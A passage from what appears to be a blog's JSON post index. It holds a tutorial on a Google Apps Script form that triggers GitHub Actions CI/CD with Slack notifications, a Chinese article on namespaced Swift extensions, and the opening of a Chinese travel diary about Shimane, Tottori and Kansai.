exceed 3 seconds, which Slack will directly determine as a failure.I managed to use Slack messages, Block Kit, and Forms to connect the entire process, but it was too easy to trigger the above issues, so I eventually gave up. If you want to do this, you still need to set up your own server and service; do not use Function as a Service!❌ Slack Workflow FormSlack Workflow Form (❌ Cannot be customized)I also tried Slack’s built-in automation feature, the Workflow Form, but it cannot create dynamic form content (e.g., fetching branches for user selection); the only customizable part is the subsequent data submission step.✅ Google Apps Script Web App GUI FormWhen one path is blocked, another opens. It seems we don’t have to be fixated on integrating with Slack. While integrating with Slack is the best solution since it directly integrates into existing team collaboration tools without needing to learn new tools, due to resource constraints, we can only settle for finding other stable and user-friendly methods. Looking back, Google Apps Script can be deployed as a Web App, allowing us to respond with a GUI Form when handling Web doGet requests, and after submitting the form, it can trigger subsequent GitHub integration processing.Final Result 🎉Demo Web App FormWorkflowWe built a CI/CD form using Google Apps Script Web App, directly binding it to Google Workspace accounts and setting it so that only users within the organization can access it. It automatically retrieves the currently logged-in user’s email, uses a shared GitHub repo account (or borrows a personal access token from an account with permissions) to call the GitHub API to get the branch list, and after submission, it also calls the API to trigger GitHub Action to start executing the CI/CD workflow.Additionally, we can use the user’s email to call the Slack API through the Slack App to obtain that user’s Slack ID, and then send messages through the Slack App to notify the status of the CI/CD task execution.We can also integrate with other tools and development processes, such as first retrieving tickets from Asana or Jira, selecting them, and then using the GitHub API to find branches, trigger GitHub Action, and finally notify the user via Slack.Step 1. Create Google Apps Script Web App FormGo to &gt; Google Apps Script and create a new project.Step 2. Create Form Content and GAS ProgramHaving not written HTML or CSS for a long time and being too lazy to design styles myself, I directly asked ChatGPT to generate an HTML form template with some design.In the left file list of GAS, click the “+” to add a file, name it “Form.html”, and paste the HTML form template content generated by GPT.Form.html：&lt;!--HTML &amp; Style Gen by ChatGPT 4o--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;&lt;?=title?&gt;&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f7f7f7; } .form-container { max-width: 600px; margin: auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); } .form-container h2 { margin-bottom: 20px; color: #333333; } .form-group { margin-bottom: 15px; } .form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #555555; } .form-group input, .form-group select, .form-group textarea { width: 95%; padding: 10px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px; } .form-group input[type=\"radio\"] { width: auto; margin-right: 10px; } .form-group .radio-label { display: inline-block; margin-right: 20px; } .form-group button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; } .form-group button:hover { background-color: #45a049; } .message { margin-top: 20px; padding: 15px; border-radius: 5px; font-size: 1em; text-align: center; } .message.success { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; } .message.error { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; } .hidden { display: none; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"form-container\"&gt; &lt;h2&gt;&lt;?=title?&gt;&lt;/h2&gt; &lt;form id=\"myForm\"&gt; &lt;div id=\"message-block\" class=\"hidden\"&gt;&lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"email\"&gt;Email:&lt;/label&gt; &lt;input type=\"email\" value=\"&lt;?=email?&gt;\" readonly/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"buildNumber\"&gt;Version Number:&lt;/label&gt; &lt;input type=\"number\" value=\"&lt;?=buildNumber?&gt;\"/&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"branch\"&gt;Reviewing PR:&lt;/label&gt; &lt;select id=\"branch\" name=\"branch\"&gt; &lt;option&gt;Please select&lt;/option&gt; &lt;? pullRequests.forEach(pullRequest =&gt; { ?&gt; &lt;option value=\"&lt;?=pullRequest.head.ref?&gt;\"&gt;[&lt;?=pullRequest.state?&gt;] &lt;?=pullRequest.title?&gt;&lt;/option&gt; &lt;? }); ?&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"message\"&gt;Update Content:&lt;/label&gt; &lt;textarea id=\"message\" name=\"message\" rows=\"4\" placeholder=\"Please enter your message\"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"form-group\"&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; function displayMessage(ok, message) { const messageBlock = document.getElementById('message-block'); messageBlock.className = ok ? 'message success' : 'message error'; messageBlock.innerHTML = message; messageBlock.classList.remove('hidden'); } document.getElementById(\"myForm\").addEventListener(\"submit\", function(e) { e.preventDefault(); const formData = new FormData(this); const formObject = Object.fromEntries(formData); google.script.run.withSuccessHandler((response) =&gt; { displayMessage(response.ok, response.message); }).processForm(formObject); }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;The content of the form can be adjusted according to your needs.`code.gs:````javascriptfunction doGet(e) { // Corresponds to the left file Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // Get the user's email, limited to the execution identity: users accessing the web application const title = \"App CD Packaging Request Form\"; const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = []; // Next step is to connect to Github... htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // Set the page width return html}function processForm(object) { return {\"ok\": true, \"message\": \"Request submitted successfully!\"};}function genBuildNumber() { const now = new Date(); const formattedDate = Utilities.formatDate(now, \"Asia/Taipei\", \"yyyyMMddHHmmss\"); const milliseconds = now.getMilliseconds().toString().padStart(3, '0'); // Ensure milliseconds are 3 digits return `${formattedDate}${milliseconds}`; }In this step, we first complete the form GUI, and in the next step, we will connect to the Github API to retrieve the PR branch list.Step 2. Deploy Google Apps Script Web App FormLet’s deploy the content we just created to check the results.In the top right corner of GAS, select “Deploy” -&gt; “New Deployment” -&gt; “Web App”:The execution identity and who can access can be set as follows:Execution Identity: Me The script will run under your account. Who can access: Only myself Who can access: All users in the same organizationOnly users from the same organization with logged-in Google accounts can access. Who can access: All logged-in Google account usersAll logged-in Google account users can access. Who can access: EveryoneNo need to log in to a Google account; everyone can access publicly.Execution Identity: Users accessing the web application The script will run under your account. Who can access: Only myself Who can access: All users in the same organizationOnly users from the same organization with logged-in Google accounts can access. Who can access: All logged-in Google account usersAll logged-in Google account users can access. By selecting “Who can access: All users in the same organization” + “Execution Identity: Users accessing the web application,” we can automatically restrict access to only organization accounts and run it under their own identity! This is a very convenient permission control feature!After making your selections, click “Deploy” in the bottom right.The URL in the web application is the access URL for the Web App.https://script.google.com/macros/s/AKfycbw8SuK7lLLMdY86y3jxMJyzXqa5tdxJryRnteOnNi-lK--j6CmKYXj7UuU58DiS0NSVvA/exec The URL is long and ugly, but there’s nothing we can do about it; we can only find a URL shortening tool to shorten it.Click the URL to open the page and see the effect:Here are two additional GAS limitations to note: The warning message at the top of the GAS Web App cannot be hidden by default. The GAS Web App embeds our page using an IFrame, making it difficult to achieve 100% responsive design (RWD) effects. You can only use .setWidth() to adjust the window width.Google Apps Script Authorization WarningThe first time you use it, clicking “Debug” or “Run” may trigger the following authorization warning:Select the account you want to execute with. If you see “This application is not verified by Google,” click “Advanced” -&gt; “Go to XXX (unsafe)” and select “Allow”:If the permissions for the GAS program change (for example, adding access to Google Sheets, etc.), you will need to reauthorize; otherwise, it will not appear again after being approved once.Step 3. Connect to the Github API to Retrieve PR Branch ListWe will add a new Github.gs script file to store the logic related to the Github API.Github.gs:// SECRETconst githubPersonalAccessToken = \"\"// Create a PAT using your Github account or a shared Github account from your organization// https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens// Method 1: Access via Restful APIfunction githubAPI(method, path, payload = null) { try { const url = \"https://api.github.com\"+path; var options = { method: method, headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" } }; if (method.toLowerCase().trim() == \"post\") { options.payload = JSON.stringify(payload); } const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// Method 2: Access via GraphQL// Some finer query functions of the Github API are only available through the GraphQL API// https://docs.github.com/en/graphqlfunction githubGraphQL(query, variables) { const url = \"https://api.github.com/graphql\"; const payload = { query: query, variables: variables }; const options = { method: \"post\", contentType: \"application/json\", headers: { \"Accept\": \"application/vnd.github+json\", \"Authorization\": `Bearer ${githubPersonalAccessToken}`, \"X-GitHub-Api-Version\": \"2022-11-28\" }, payload: JSON.stringify(payload) }; try { const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); return data; } catch (error) { throw error; }}// GraphQL Example:// const query = `// query($owner: String!, $repo: String!) {// repository(owner: $owner, name: $repo) {// pullRequests(states: OPEN, first: 100, orderBy: { field: CREATED_AT, direction: DESC }) {// nodes {// title// url// number// createdAt// author {// login// }// headRefName// baseRefName// body// }// pageInfo {// hasNextPage// endCursor// }// }// }// }// `;// const variables = {// owner: \"swiftlang\",// repo: \"swift\"// };// const response = githubGraphQL(query, variables);There are two ways to access the Github API: the traditional Restful method and the more flexible GraphQL method; this article uses Restful as an example.code.gs:function doGet(e) { // Corresponds to the left file Form.html const htmlTemplate = HtmlService.createTemplateFromFile('Form'); const email = Session.getActiveUser().getEmail(); // Get the user's email, limited to the execution identity: users accessing the web application const title = \"App CD Packaging Request Form\"; const pullRequests = githubAPI(\"get\", \"/repos/swiftlang/swift/pulls\"); // Using https://github.com/swiftlang/swift/pulls as an example const buildNumber = genBuildNumber(); htmlTemplate.email = email; htmlTemplate.title = title; htmlTemplate.pullRequests = pullRequests; htmlTemplate.buildNumber = buildNumber; const html = htmlTemplate.evaluate(); html.setTitle(title); //html.setWidth(600) // Set the page width return html}function processForm(object) { if (object.buildNumber == \"\") { return {\"ok\": false, \"message\": \"Please enter a version number!\"}; } if (object.branch == \"\") { return {\"ok\": false, \"message\": \"Please select a branch version!\"}; } // Include the parameters you want to pass to Github Action const payload = { ref: object.branch, inputs: { buildNumber: object.buildNumber } }; // try { const response = githubAPI(\"post\", \"/repos/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/actions/workflows/CD-Job.yml/dispatches\", payload); // Using https://github.com/zhgchgli0718/ios-project-for-github-action-ci-cd-demo/blob/main/.github/workflows/CD-Job.yml as an example return {\"ok\": true, \"message\": `Packaging request sent successfully!&lt;br/&gt;Corresponding branch: &lt;strong&gt;${object.branch}&lt;/strong&gt;&lt;br/&gt;Version number: &lt;strong&gt;${object.buildNumber}&lt;/strong&gt;`}; } catch (error) { return {\"ok\": false, \"message\": \"An error occurred: \" + error.message}; }}The processForm method handles the content returned from the form and can also include more parameters.GAS x Github API x Github ActionHere, I will add some details corresponding to the Github Action.CD-Job.yml:# CD Packaging Jobname: CD-Jobon: workflow_dispatch: inputs: buildNumber: # Corresponds to GAS payload.inputs.xxx description: 'Version number' required: false type: string # ...More # Input types can refer to the official documentation: https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#onworkflow_dispatchinputs jobs: some-job: runs-on: ubuntu-latest steps: - name: Print Inputs run: | echo \"Release Build Number: ${{ github.event.inputs.buildNumber }}\" Step 4. Redeploy Google Apps Script Web App Form ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️ ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️ ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️In the top right corner of GAS, select “Deploy” -&gt; choose “Edit” in the top right -&gt; select “Create new version”.Click “Deploy” -&gt; complete.Then return to the webpage and refresh to see the modified results: ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️ ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️ ⚠️ Please note that any adjustments to the GAS code require redeployment to take effect. ⚠️Done! 🎉🎉🎉Demo Web App FormNow you can share this link within your organization with other partners, and they can directly use this web GUI to execute CI/CD tasks.Extension (1) — Query Slack User ID Using User’s Email &amp; Send/Update Progress NotificationsAs mentioned earlier, we want to notify users of the CI/CD execution status in real-time. We can use the email provided by the user to look up the Slack User ID.Slack.gs:const slackBotToken = \"\"// https://medium.com/zrealm-robotic-process-automation/slack-chatgpt-integration-bd94cc88f9c9function slackRequest(path, content) { const options = { method: \"post\", contentType: \"application/json\", headers: { Authorization: `Bearer ${slackBotToken}`, // Use the bot token for authorization, 'X-Slack-No-Retry': 1 }, payload: JSON.stringify(content) }; try { const response = UrlFetchApp.fetch(\"https://slack.com/api/\"+path, options); const responseData = JSON.parse(response.getContentText()); if (responseData.ok) { return responseData } else { throw new Error(`Slack: ${responseData.error}`); } } catch (error) { throw error; }}// Query Slack UID using emailfunction getSlackUserId(email) { return slackRequest(`users.lookupByEmail?email=${encodeURIComponent(email)}`)?.user?.id;}// Send a message to the target Slack UID (channelID)function sendSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.thread_ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.postMessage\", content);}// Update the content of the sent messagefunction updateSlackMessage(channelId, ts = null, value) { var content = { channel: channelId }; if (ts != null) { content.ts = ts; } if (typeof value === \"string\") { content.text = value; } else { content.blocks = value; } return slackRequest(\"chat.update\", content);}For Slack API usage, please refer to the official documentation.Github Action YAML can use this Action to continuously update messages and send Slack messages:# ...on: workflow_dispatch: inputs: buildNumber: # Corresponds to GAS payload.inputs.xxx description: 'Version number' required: false type: string # ...More SLACK_USER_ID: description: 'Slack User Id for receiving action notifications' type: string SLACK_CHANNEL_ID: description: 'Slack Channel Id for receiving action notifications' type: string SLACK_THREAD_TS: description: 'Slack message ts' type: string jobs: # some jobs... if-deploy-failed-message: runs-on: ubuntu-latest if: failure() - name: update slack message uses: slackapi/slack-github-action@v2.0.0 with: method: chat.update token: ${{ secrets.SLACK_BOT_TOKEN }} payload: | channel: ${{ github.event.inputs.SLACK_CHANNEL_ID }} ts: ${{ github.event.inputs.SLACK_THREAD_TS }} text: \"❌ Packaging task failed, please check the execution status or try again later.\\n&lt;${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}|Click here to view execution status&gt; cc'ed &lt;@${{ github.event.inputs.SLACK_USER_ID }}&gt;\"Effect: For details on integrating Slack Apps, please refer to my previous article: Slack &amp; ChatGPT Integration.Extension (2) — Query Jira TicketsJira.gs:const jiraPersonalAccessToken = \"\"// https://confluence.atlassian.com/enterprise/using-personal-access-tokens-1026032365.htmlfunction getJiraTickets() { const url = `https://xxx.atlassian.net/rest/api/3/search`; // JQL query const jql = `project = XXX`; const queryParams = { jql: jql, maxResults: 50, // Adjust as needed }; const options = { method: \"get\", headers: { Authorization: \"Basic \" + jiraPersonalAccessToken, \"Content-Type\": \"application/json\", }, muteHttpExceptions: true, };```javascriptconst queryString = Object.keys(queryParams).map(key =&gt; `${encodeURIComponent(key)}=${encodeURIComponent(queryParams[key])}`).join(\"&amp;\");const response = UrlFetchApp.fetch(url + \"?\" + queryString + \"&amp;fields=\", options);// could specify only return some fieldsif (response.getResponseCode() === 200) { const issues = JSON.parse(response.getContentText()).issues; return issues;} else { Logger.log(`Error: ${response.getResponseCode()} - ${response.getContentText()}`); throw new Error(\"Failed to fetch Jira issues.\");}For other Jira API usage, please refer to the official documentation.Extension (3) — Query Asana TasksAsana.gs:const asanaPersonalAccessToken = \"\"// https://developers.asana.com/docs/personal-access-tokenfunction asanaAPI(endpoint, method = \"GET\", data = null) { var options = { \"method\" : method, \"contentType\" : \"application/json\", \"headers\": { \"Authorization\": \"Bearer \"+asanaPersonalAccessToken } }; if (data != null) { options[\"payload\"] = JSON.stringify({\"data\":data}); } const url = \"https://app.asana.com/api/1.0\"+endpoint; const res = UrlFetchApp.fetch(url, options); const data = JSON.parse(res.getContentText()); return data;}// Find tasks in project// asanaAPI(\"/projects/PROJECT_ID/tasks\");For other Asana API usage, please refer to the official documentation.SummaryThe missing element in automation, work, and development process optimization is never technology, but rather ideas; as long as we have ideas, we can find the right technology to implement them. Let’s encourage each other!If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 183 Total Views Last Statistics Date: 2025-08-15 | 177 Views on Medium." }, { "title": "Swift 一個優雅的原生類型擴展方式", "url": "/posts/zrealm-dev/swift-%E4%B8%80%E5%80%8B%E5%84%AA%E9%9B%85%E7%9A%84%E5%8E%9F%E7%94%9F%E9%A1%9E%E5%9E%8B%E6%93%B4%E5%B1%95%E6%96%B9%E5%BC%8F-a8925ad9ed01/", "categories": "ZRealm Dev.", "tags": "ios-app-development, swift, wrapper, app-modularization, ios", "date": "2025-01-01 22:02:32 +0800", "snippet": "[Swift] 一個優雅的 原生類型擴展方式自行封裝擴充方法，使其有 Namespace 的功能https://www.swift.org/ 做法實際出處不詳，是從厲害同事的 Code 上學到的。原生類型擴展在日常的 iOS/Swift 開發中，我們常常需要對原生 API 進行擴充、撰寫自己的 Helper。以下以擴充 UIColor 為例，我們希望擴充 UIColor 使其能轉換成 HE...", "content": "[Swift] 一個優雅的 原生類型擴展方式自行封裝擴充方法，使其有 Namespace 的功能https://www.swift.org/ 做法實際出處不詳，是從厲害同事的 Code 上學到的。原生類型擴展在日常的 iOS/Swift 開發中，我們常常需要對原生 API 進行擴充、撰寫自己的 Helper。以下以擴充 UIColor 為例，我們希望擴充 UIColor 使其能轉換成 HEX Color String：extension UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}直接對 UIColor 進行擴充 (Extension) 後的存取方式如下：let color = UIColor.bluecolor.toHexString() // #0000ff問題當我們自定義的擴充方式越來越多會讓存取介面開始變得混亂，例如：let color = UIColor.bluecolor.getRed(...)color.getWhite(...)color.getHue(...)color.getCMYK() // 自行擴充的方法color.toHexString() // 自行擴充的方法color.withAlphaComponent(...)color.setFill(...)color.setToBlue() // 自行擴充的方法// A Modulepublic extension UIColor { func getCMYK() { // ... }}// B Module// Invalid redeclaration of 'getCMYK()'public extension UIColor { func getCMYK() { // ... }}我們自行擴充的方法跟原生提供的方法全部混合在一起，難以區分；另外專案規模越大、引用的套件越多也有可能遇到 Extension 命名衝突，例如兩個套件都對 UIColor Extension 也都叫 getCMYK() 就會有問題。自訂擴展 Namespace 容器我們可以運用 Swift Protocol, Computed Property 與 泛型的特型來自行封裝擴充方法，使其有 Namespace 的功能。// 宣告一個泛型容器 ExtensionContainer&lt;Base&gt;：public struct ExtensionContainer&lt;Base&gt; { public let base: Base public init(_ base: Base) { self.base = base }}// 定義 for AnyObject, Class(Reference) Type 實現的接口：// 例如 Foundation 中的 NSXXX 類別public protocol ExtensionCompatibleObject: AnyObject {}// 定義 for Struct(Value) Type 實現的接口：public protocol ExtensionCompatible {}// 自訂義 Namespace Computed Property：public extension ExtensionCompatibleObject { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}public extension ExtensionCompatible { var zhg: ExtensionContainer&lt;Self&gt; { return ExtensionContainer(self) }}擴展原生類型extension UIColor: ExtensionCompatibleObject {}extension ExtensionContainer where Base: UIColor { /// Convert a UIColor to a hex string representation. /// - Returns: A hex string (e.g., \"#RRGGBB\" or \"#RRGGBBAA\"). func toHexString(includeAlpha: Bool = false) -&gt; String? { var red: CGFloat = 0 var green: CGFloat = 0 var blue: CGFloat = 0 var alpha: CGFloat = 0 guard self.base.getRed(&amp;red, green: &amp;green, blue: &amp;blue, alpha: &amp;alpha) else { return nil // Color could not be represented in RGB space } if includeAlpha { return String(format: \"#%02X%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255), Int(alpha * 255)) } else { return String(format: \"#%02X%02X%02X\", Int(red * 255), Int(green * 255), Int(blue * 255)) } }}使用let color = UIColor.bluecolor.zhg.toHexString() // #0000ff範例 2. URL .queryItems 擴充extension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { var queryParameters: [String: String]? { URLComponents(url: base, resolvingAgainstBaseURL: true)? .queryItems? .reduce(into: [String: String]()) { $0[$1.name] = $1.value } }}結合 Builder Pattern另外我們也可以將此封裝方式結合 Builder Pattern 操作：final class URLBuilder { private var components: URLComponents init(base: URL) { self.components = URLComponents(url: base, resolvingAgainstBaseURL: true)! } func setQueryParameters(_ parameters: [String: String]) -&gt; URLBuilder { components.queryItems = parameters.map { .init(name: $0.key, value: $0.value) } return self } func setScheme(_ scheme: String) -&gt; URLBuilder { components.scheme = scheme return self } func build() -&gt; URL? { return components.url }}extension URL: ExtensionCompatible {}extension ExtensionContainer where Base == URL { func builder() -&gt; URLBuilder { return URLBuilder(base: base) }}let url = URL(string: \"https://zhgchg.li\")!.zhg.builder().setQueryParameters([\"a\": \"b\", \"c\": \"d\"]).setScheme(\"ssh\").build()// ssh://zhgchg.li?a=b&amp;c=d有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 341 Total Views Last Statistics Date: 2025-08-15 | 196 Views on Medium." }, { "title": "遊記 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行", "url": "/posts/z-%E5%BA%A6%E6%97%85%E8%A1%8C%E9%81%8A%E8%A8%98/%E9%81%8A%E8%A8%98-2024-%E5%B1%B1%E9%99%B0%E5%BB%A3%E5%9F%9F%E5%9C%B0%E5%8D%80-%E5%B3%B6%E6%A0%B9-%E5%87%BA%E9%9B%B2-%E6%9D%BE%E6%B1%9F-%E9%B3%A5%E5%8F%96-%E5%A7%AC%E8%B7%AF-%E5%A4%A7%E9%98%AA-%E7%A5%9E%E6%88%B6-7-%E6%97%A5%E7%8D%A8%E6%97%85%E8%87%AA%E7%94%B1%E8%A1%8C-aacd5f5cacd1/", "categories": "Z 度旅行遊記", "tags": "生活, japan, travel-writing, 島根縣, 旅遊", "date": "2024-12-03 00:04:56 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行岡山進出，先去山陰島根縣出雲松江再去鳥取，最後回到姬路、關西、大阪；7 天 10 萬步、交通橫跨 1,000 公里，一次踩點山陰關西地...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[遊記] 2024 山陰廣域地區 島根 出雲 松江 鳥取 姬路 大阪 神戶 7 日獨旅自由行岡山進出，先去山陰島根縣出雲松江再去鳥取，最後回到姬路、關西、大阪；7 天 10 萬步、交通橫跨 1,000 公里，一次踩點山陰關西地區。宍道湖夕陽前言最一開始 2024 下半年是想去仙台的，不過查了一下景點資料，這個時間點去，我的興趣普普；回想到去年同一週 11/13–18 去了 「 山陽地區 廣島岡山 6 日自由行 」 對中國地方、山陽、岡山的印象很好 — 景色很美、交通方便、觀光客較少；因此想說這次把山陰地區(島根、鳥取)也走一遍，剛好工作也有空檔跟近期心煩意亂急需放空；促成了這次 7 天 6 夜山陰地區(加上關西地區：姬路、大阪)獨旅自由行。準備工作日期：11/12–18這次也是 P 人發作，10 月中臨時抓到時間空檔，隨即安排 11/12 出發，11/18 回程。✈️機票今年沒有特別搶虎航秋季活動機票， 去年有買到優惠機票 時間比較好又比較便宜( 去年：去(11:10)、回(15:25)，含來回 20KG 託運＋選位＋雜費：NT$ 7,012 )。 去：13:05 TPE 台北桃園國際機場-&gt; 16:30 OKJ 岡山桃太郎機場 回： 17:30 OKJ 岡山桃太郎機場 -&gt; 19:35 TPE 台北桃園國際機場 含來回 20KG 托運＋選位＋雜費價格： NT$ 9,118沒特別便宜，但還可以接受，如果選同去年的去回時間會更貴，大概要 NT$ 12,000 。虎航 2025 新直飛航線台灣虎航於2025年5月29(四)，起新增「桃園國際機場－鳥取米子機場」直飛航班，去山陰地區就更方便了！🏝️計畫沒去過山陰地區跟姬路，以這三個地方為主。 11/12 晚上抵達岡山，住一晚為明早去島根做準備 11/13 一早搭 JR 前往島根，先去出雲大社、稻佐海濱，下午傍晚去宍道湖看夕陽 11/14 早上松江城、松江堀川遊船，下午足立美術館，晚上抵達鳥取 11/15 早上白兔神社、下午鳥取沙丘，晚上抵達姬路 11/16 姬路城、姬路市區逛街實際多去：書寫山圓教寺 11/17 大鳴門橋遊歩道 渦之道、鳴門旋渦、明石海峽大橋實際因天氣不佳沒去，改去大阪、神戶逛街吃東西。 11/18 岡山站逛街、回程🚅行- 日本 JR PASS｜關西&amp;山陰地區鐵路周遊券｜eMCO 電子票這次也是長距離移動，必買 JR Pass，本來還怕只有山陰、山陽 JRass，沒想到日本 JR 很貼心的把有可能的路線都規劃好了，有「 關西&amp;山陰地區鐵路周遊券 JRPass 」正合我意！關西&amp;山陰地區鐵路周遊券 JRPass 可用範圍 價格： NT$ 3,779 多送一張 山陰山陽地區PASS周遊3日券 (搭配用起來很划算)📱網路這次也一併從 KKday 買「 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案｜優惠65折 」 7 日 無限流量 eSIM 方案 價格： NT$ 847實際用下來很好，很穩定、沒遇到被降速或斷線問題。 eSIM 啟用方式、注意事項本文中會附上，請繼續閱讀。日幣換了日幣新鈔。 建議新舊鈔都帶一些，部分販賣機無法吃新鈔。可以吃新鈔的販賣機🏠住宿這次很幸運地只有松江一晚沒訂到 東橫 Inn ，其他都有訂到。11/12 東橫INN 岡山站東口 (一晚)出岡山車站走 4 分鐘就會到 禁煙雙床房，入住：1 人 價格： NT$ 1,61611/13 Matsue Urban Hotel (一晚)松江站出站走 2 分鐘就會到 Double Room with Small Double Bed — Non-Smoking — Building 2入住：1 人 價格： NT$ 2,43111/14 東橫INN 鳥取站南口 (一晚)鳥取站出站走 4 分鐘就會到 禁煙雙人房，入住：1 人 價格： NT$ 1,59511/15 東橫INN 姬路站新幹線北口 (三晚)姬路站出站走 5 分鐘會到 禁煙雙人房，入住：1 人 價格： NT$ 6,055 ， NT$ 2,018 /晚雖然幾乎都有訂到東橫，但還是因為預定時間太晚只剩雙人房，所以一晚的價格比較高，如果有訂到單人房型應該可以壓到一晚 NT$ 1,500 以內；不過以往經驗，日期接近就算是雙人房也都會全滿，可能地點真的比較少人去？ 房間開箱影片本文中會附上，請繼續閱讀。— Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。 Visit Japan 唯一跟之前不一樣的只有「入境審查」與「海關申報」QR Code 已合併成同一個「入境审查及海关申报的QR码」，沒有藍碼黃碼區別。虎航線上自助報到約出發前 1~3 天會收到虎航寄發的行程通知信， 務必！務必！務必！ 在出發前直接完成線上「自助報到」：點擊自助報到後會前往虎航官網，確認旅客資料、行李安全，最後會產生、寄發「登機證」。保存好登機證，憑此去機場就可以直接排「行李自助托運」掛行李，不用浪費時間排長長的「一般報到」櫃檯。さあ行こう 出發！KKday 推廣 🛒 日本 JR PASS|鳥取・松江區域周遊券|eMCO 電子票 (如果只去松江、鳥取松江地區可考慮) 關西&amp;山陰地區鐵路周遊券 JRPass (岡山機場進出最佳選擇) 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 日本 JR PASS｜山陽＆山陰地區鐵路周遊券｜eMCO 電子票 (一口氣玩遍山陽山陰地區) 鳥取沙丘 | 日本唯一的驚險滑沙體驗 【鳥取巴士一日遊】鳥取砂丘、浦富海岸巡航、砂之美術館、採梨子體驗｜含特色午餐（大阪出發） 遊覽鳥取沙丘和著名的出雲大社 2 日巴士之旅（大阪出發） 新年參觀！出雲大社停留3小時【廣島出發】Day 1 (11/12 週二) 出發下午 13:05 的飛機，早上 8 點起床快 9 點出門，時間上綽綽有餘。2024/11 擷取自預辦登機官網虎航 預辦登機服務(在機捷就報到+掛行李，到機場直接出境) 只能在 機捷A3新北產業園區站 ；不能在北車，所以就一路搭機捷直達車前往第一航廈了。~= 10:00 抵達機場大約 10:00 就抵達機場，要等 10:20 才開櫃。~= 10:20 排「行李自助托運」掛行李去程：9 KG這時候是先從虎航網站使用網路報到的優勢就來了，當天目測現場「一般報到」櫃檯大排長龍，10:20 就已經排滿，預估至少要等 45 分鐘到 1 小時；「行李自助托運」這邊大概花不到 15 分鐘就完成手續，節省很多等待時間。 現場完成線上報到，再去排「行李自助托運」都比去排「一般報到」快得多。~= 10:50 完成出境這次在第一航廈的 A1 登機門。(終於不用再搭擺渡車了)之前來第一航廈每次都吃頂呱呱，這次改吃老董牛肉麵，店面位置就在快到 A1 登機門的地方也很順路。~= 11:30 候機吃飽亂晃一下大約 11:30，A1 登機門的壞處是離 一航免費貴賓室 